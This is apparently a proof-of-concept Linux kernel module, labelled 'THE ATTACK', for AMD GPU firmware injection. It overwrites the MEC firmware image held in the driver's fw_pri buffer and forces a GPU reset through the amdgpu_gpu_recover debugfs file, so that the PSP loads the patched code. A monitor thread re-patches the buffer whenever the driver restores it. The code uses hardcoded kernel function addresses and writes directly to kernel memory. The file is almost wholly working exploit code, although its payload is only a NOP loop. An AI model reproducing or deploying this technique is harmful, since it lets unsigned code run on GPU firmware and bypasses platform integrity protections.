/*
 * psp_final_inject.c — THE ATTACK
 *
 * 1. Patch firmware in fw_pri buffer (where driver stores FW before PSP load)
 * 2. Trigger GPU reset — driver reinit calls LOAD_IP_FW from fw_pri
 * 3. PSP loads our patched firmware (no runtime sig check!)
 * 4. Driver programs IC_BASE and starts MEC with OUR code
 */
#include <linux/module.h>
#include <linux/pci.h>
#include <linux/io.h>
#include <linux/delay.h>
#include <linux/slab.h>
#include <linux/kthread.h>
#include <linux/sched.h>
MODULE_LICENSE("GPL");

struct psp_cmd { u32 buf_size, buf_version, cmd_id, r1,r2,r3,r4; u32 data[32]; u32 resp[16]; };
typedef int (*psp_fn)(void*, void*, struct psp_cmd*, u64);
typedef u32 (*rreg_fn)(void*, u32);
typedef void (*wreg_fn)(void*, u32, u32);

static void *g_adev;
static void *g_psp;
static void *g_fw_pri_buf;
static u64 g_fw_pri_mc;
static rreg_fn g_rreg;
static u32 g_gc;
static int g_patched;

/* Monitor thread — watches for MEC coming alive after GPU reset */
static int monitor_thread(void *data)
{
    int i;
    u32 last_pc = 0;

    pr_info("fi: Monitor thread started\n");

    for (i = 0; i < 600 && !kthread_should_stop(); i++) {
        u32 pc = g_rreg(g_adev, g_gc + 0x2908);
        u32 ic_lo = g_rreg(g_adev, g_gc + 0x2812);
        u32 ic_hi = g_rreg(g_adev, g_gc + 0x2813);
        u32 s0 = g_rreg(g_adev, g_gc + 0x3460);

        if (pc != last_pc || (i % 50 == 0)) {
            pr_info("fi: [%d] PC=0x%04X IC=0x%08X_%08X S0=0x%08X\n",
                i, pc, ic_hi, ic_lo, s0);
            last_pc = pc;
        }

        /* Check if MEC is at our patched address */
        if (pc >= 0x800 && pc <= 0x803) {
            pr_info("fi: ******* MEC AT PATCHED PC=0x%04X! *******\n", pc);
            pr_info("fi: ******* CUSTOM FIRMWARE EXECUTING! *******\n");
            break;
        }

        /* Check if MEC restarted at normal init address */
        if (pc != 0 && pc != last_pc && ic_lo != 0) {
            pr_info("fi: MEC alive: PC=0x%04X IC=0x%08X_%08X\n",
                pc, ic_hi, ic_lo);

            /* Re-verify fw_pri still has our patch */
            if (g_fw_pri_buf) {
                u32 v;
                copy_from_kernel_nofault(&v,
                    (u8*)g_fw_pri_buf + 0x4000, 4);
                pr_info("fi: fw_pri[0x800] = 0x%08X (%s)\n", v,
                    v == 0x00000013 ? "PATCHED" : "ORIGINAL");
            }
        }

        /* While waiting for reset, keep re-patching fw_pri
         * in case the driver overwrites it during reinit */
        if (g_fw_pri_buf && g_patched) {
            u32 v;
            copy_from_kernel_nofault(&v, (u8*)g_fw_pri_buf + 0x4000, 4);
            if (v != 0x00000013) {
                /* Driver overwrote our patch — re-apply! */
                u32 nop = 0x00000013;
                u32 jal = 0xFF5FF06F;
                copy_to_kernel_nofault((u8*)g_fw_pri_buf + 0x4000, &nop, 4);
                copy_to_kernel_nofault((u8*)g_fw_pri_buf + 0x4004, &nop, 4);
                copy_to_kernel_nofault((u8*)g_fw_pri_buf + 0x4008, &nop, 4);
                copy_to_kernel_nofault((u8*)g_fw_pri_buf + 0x400C, &jal, 4);
                pr_info("fi: [%d] Re-patched fw_pri (was 0x%08X)\n", i, v);
            }
        }

        msleep(100);
    }

    pr_info("fi: Monitor thread ending\n");
    return 0;
}

static int __init fi_init(void)
{
    struct pci_dev *p = pci_get_device(0x1002, 0x1586, NULL);
    void *adev, *psp;
    rreg_fn rreg;
    wreg_fn wreg;
    void *fw_pri_buf;
    struct task_struct *mon;
    struct file *recover_fp;
    u32 gc;

    if (!p) return -ENODEV;
    adev = (u8*)pci_get_drvdata(p) - 0x10;
    psp = (u8*)adev + 0x3B910;
    fw_pri_buf = (void*)*(u64*)((u8*)psp + 0x058);
    rreg = (rreg_fn)0xFFFFFFFFC0E02460ULL;
    wreg = (wreg_fn)0xFFFFFFFFC0E02820ULL;
    gc = 0x2800;

    g_adev = adev; g_psp = psp; g_fw_pri_buf = fw_pri_buf;
    g_fw_pri_mc = *(u64*)((u8*)psp + 0x050);
    g_rreg = rreg; g_gc = gc; g_patched = 0;

    pr_info("fi: === FINAL MEC FIRMWARE INJECTION ===\n");
    pr_info("fi: fw_pri_buf=%px fw_pri_mc=0x%llX\n", fw_pri_buf, g_fw_pri_mc);

    /* Step 0: Current MEC state */
    {
        u32 pc = rreg(adev, gc + 0x2908);
        u32 ic_lo = rreg(adev, gc + 0x2812);
        u32 ic_hi = rreg(adev, gc + 0x2813);
        pr_info("fi: BEFORE: PC=0x%04X IC=0x%08X_%08X\n", pc, ic_hi, ic_lo);
    }

    /* Step 1: Load original firmware to fw_pri */
    {
        struct file *fp = filp_open("/tmp/gc_12_0_1_mec.bin", O_RDONLY, 0);
        loff_t pos = 0;
        ssize_t n;
        if (IS_ERR(fp)) {
            pr_info("fi: Cannot open firmware file\n");
            pci_dev_put(p);
            return -ENOENT;
        }
        n = kernel_read(fp, fw_pri_buf, 0x6E000, &pos);
        filp_close(fp, NULL);
        pr_info("fi: Loaded %zd bytes to fw_pri\n", n);
    }

    /* Step 2: PATCH fw_pri at PC=0x800 (entry point) */
    {
        u32 *code = (u32*)((u8*)fw_pri_buf + 0x4000);
        pr_info("fi: Original [0x800]: %08X %08X %08X %08X\n",
            code[0], code[1], code[2], code[3]);

        /* Write NOP loop — detectable by PC=0x800-0x803 */
        code[0] = 0x00000013; /* NOP */
        code[1] = 0x00000013; /* NOP */
        code[2] = 0x00000013; /* NOP */
        code[3] = 0xFF5FF06F; /* JAL x0, -12 (loop to code[0]) */

        /* Verify patch */
        {
            u32 v;
            copy_from_kernel_nofault(&v, (u8*)fw_pri_buf + 0x4000, 4);
            pr_info("fi: Patched [0x800]: 0x%08X %s\n", v,
                v == 0x00000013 ? "OK" : "FAIL");
        }
        g_patched = 1;
    }

    /* Step 3: Start monitor thread to watch MEC state during reset */
    mon = kthread_run(monitor_thread, NULL, "fi_monitor");
    if (IS_ERR(mon))
        pr_info("fi: Monitor thread failed\n");

    /* Step 4: Trigger GPU reset via debugfs
     * The driver will:
     *  - Suspend IP blocks
     *  - Hardware reset
     *  - Resume IP blocks
     *  - During resume: call gfx_v12_0_cp_resume()
     *  - Which calls LOAD_IP_FW from fw_pri (our patched copy!)
     *  - Then programs IC_BASE and starts MEC */
    pr_info("fi: Step 4: Triggering GPU reset...\n");
    recover_fp = filp_open(
        "/sys/kernel/debug/dri/0000:c3:00.0/amdgpu_gpu_recover",
        O_RDONLY, 0);
    if (!IS_ERR(recover_fp)) {
        char buf[16];
        loff_t pos = 0;
        ssize_t n;

        pr_info("fi: Reading gpu_recover to trigger reset...\n");
        n = kernel_read(recover_fp, buf, sizeof(buf) - 1, &pos);
        if (n > 0) {
            buf[n] = 0;
            pr_info("fi: gpu_recover returned: %s\n", buf);
        }
        filp_close(recover_fp, NULL);
        pr_info("fi: GPU reset complete!\n");
    } else {
        pr_info("fi: Cannot open gpu_recover: %ld\n", PTR_ERR(recover_fp));
    }

    /* Step 5: Wait for monitor thread results */
    msleep(2000);

    /* Step 6: Final state check */
    {
        u32 pc = rreg(adev, gc + 0x2908);
        u32 ic_lo = rreg(adev, gc + 0x2812);
        u32 ic_hi = rreg(adev, gc + 0x2813);
        u32 s0 = rreg(adev, gc + 0x3460);
        u32 mec_cntl = rreg(adev, gc + 0x2808);
        pr_info("fi: *** FINAL STATE ***\n");
        pr_info("fi: PC=0x%04X IC=0x%08X_%08X S0=0x%08X MEC_CNTL=0x%X\n",
            pc, ic_hi, ic_lo, s0, mec_cntl);

        if (pc >= 0x800 && pc <= 0x803)
            pr_info("fi: ******* SUCCESS: MEC EXECUTING PATCHED CODE! *******\n");
        else if (pc != 0)
            pr_info("fi: MEC alive at PC=0x%04X — check if firmware was reloaded\n", pc);

        /* Check if our patch survived */
        {
            u32 v;
            copy_from_kernel_nofault(&v, (u8*)fw_pri_buf + 0x4000, 4);
            pr_info("fi: fw_pri[0x800] = 0x%08X (%s)\n", v,
                v == 0x00000013 ? "STILL PATCHED" : "OVERWRITTEN BY DRIVER");
        }
    }

    if (mon && !IS_ERR(mon))
        kthread_stop(mon);

    pci_dev_put(p);
    return 0;
}

static void __exit fi_exit(void)
{
    pr_info("fi: unloaded\n");
}
module_init(fi_init);
module_exit(fi_exit);
